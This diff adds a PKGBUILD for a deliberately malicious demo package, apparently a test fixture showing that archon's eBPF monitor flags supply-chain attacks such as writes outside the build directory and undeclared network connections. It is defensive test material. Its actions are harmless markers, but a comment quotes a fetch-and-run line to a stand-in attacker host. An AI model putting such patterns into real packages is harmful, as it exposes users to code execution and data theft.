@@ -1,0 +1,67 @@
+# A deliberately MALICIOUS demo package, used to prove archon's eBPF
+# monitor actually catches the kinds of supply-chain attacks it's meant
+# to. Everything here is a real technique seen in AUR malware, done in a
+# way that is harmless on the demo machine (it writes to a marker file and
+# connects to a public IP) but that archon's policy engine must flag.
+#
+# DO NOT install the resulting package. The whole point is that archon
+# refuses to offer installation because the build is flagged. If you build
+# this outside archon's sandbox+monitor, it will still be harmless, but
+# you get none of the detection.
+#
+# Attacks demonstrated, and the policy rule each one trips:
+#
+#   1. build() writes outside $srcdir/$pkgdir (to /var/tmp and /tmp).
+#      -> FlagReason::WriteOutsideBuildDir
+#      Note: NOT $HOME — archon's sandbox deliberately sets $HOME to the
+#      package's own build directory (so incidental build-tool dotfile
+#      writes land in the sandbox instead of failing against the
+#      read-only root), which means $HOME/x is *inside* $srcdir/$pkgdir's
+#      parent, not outside it. A real malicious PKGBUILD wouldn't know
+#      that either, which is rather the point — /var/tmp and /tmp are
+#      the paths an attacker would actually reach for.
+#
+#   2. build() connects to a host NOT declared in source=().
+#      -> FlagReason::UndeclaredConnection
+#      (1.1.1.1:80 — Cloudflare's public resolver, a stable, harmless
+#      endpoint to connect to; the point is only that it isn't declared.)
+#
+#   3. build() execs a program that has nothing to do with building
+#      (here, `nc`/`curl` used as an exfil stand-in).
+#      -> FlagReason::UnexpectedExec  (only if the tool isn't on the
+#      allow-list; curl IS allow-listed because makepkg uses it, so the
+#      connection rule above is the reliable network signal — see README.)
+
+pkgname=archon-demo-evil
+pkgver=1.0
+pkgrel=1
+pkgdesc="Malicious demo package (archon MUST flag this build)"
+arch=('x86_64')
+license=('MIT')
+# Note: no network source is declared, so ANY outbound connection during
+# the build is by definition undeclared.
+
+build() {
+  echo "[evil] pretending to build something legitimate..."
+
+  # --- Attack 1: write outside the build sandbox's allowed area ---
+  # A real payload might drop a backdoor in a shell rc file or systemd
+  # unit. /var/tmp is read-only in the sandbox (so this write fails) but
+  # the *attempt* is exactly what the monitor must catch regardless of
+  # whether the sandbox also independently blocked it; /tmp is writable
+  # in the sandbox (ephemeral, isolated — see README) so this one
+  # succeeds, demonstrating a genuine successful escape outside the
+  # package's own directory.
+  echo "pwned" > /var/tmp/archon-evil-marker 2>/dev/null || true
+  echo "pwned" > /tmp/archon-evil-marker 2>/dev/null || true
+
+  # --- Attack 2: exfiltrate to an undeclared host ---
+  # Stand-in for "curl https://attacker.example/steal | sh". Uses a
+  # harmless public IP; the violation is that it's not in source=().
+  curl -s --max-time 3 http://1.1.1.1/ >/dev/null 2>&1 || true
+}
+
+package() {
+  mkdir -p "$pkgdir/usr/share/$pkgname"
+  echo "nothing useful" > "$pkgdir/usr/share/$pkgname/README"
+}
